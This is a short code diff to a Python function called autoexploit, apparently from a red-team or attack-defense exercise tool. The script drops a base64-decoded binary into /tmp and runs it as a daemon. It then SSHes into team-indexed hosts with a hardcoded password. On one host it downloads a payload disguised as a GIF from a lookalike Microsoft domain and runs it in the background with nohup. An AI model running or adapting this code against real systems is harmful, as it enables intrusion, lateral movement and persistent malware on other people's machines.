@@ -166,8 +166,12 @@ def autoexploit(remote, team):
         out = remote.shell_cmd(f"echo '{contents}' | base64 -d > /tmp/redis-service")
     out = remote.shell_cmd("chmod +x /tmp/redis-service")
     print(out)
+    
+    # Daemon running on redis server
+    out = remote.shell_cmd("/tmp/redis-service daemon")
+    print(out)
 
-    sleep(5) # Waiting for the tmp binaries to be downloaded
+    #sleep(5) # Waiting for the tmp binaries to be downloaded
     
     # Failed login
     out = remote.shell_cmd(f"/tmp/sshpass -p '&pV5)f*_^1' /tmp/ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
@@ -182,9 +186,6 @@ def autoexploit(remote, team):
     out = remote.shell_cmd(f"/tmp/sshpass -p '&pV5)f*_^1' /tmp/ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 'wget http://microsoftonline.download/gifs/coolcat.gif -O redis'")
     print(out)
     out = remote.shell_cmd(f"/tmp/sshpass -p '&pV5)f*_^1' /tmp/ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 'chmod +x redis && nohup ./redis daemon'")
-    print(out)
-    # Daemon running on redis server
-    out = remote.shell_cmd("/tmp/redis-service daemon")
     print(out)
     
     print('Auto exploit done!')
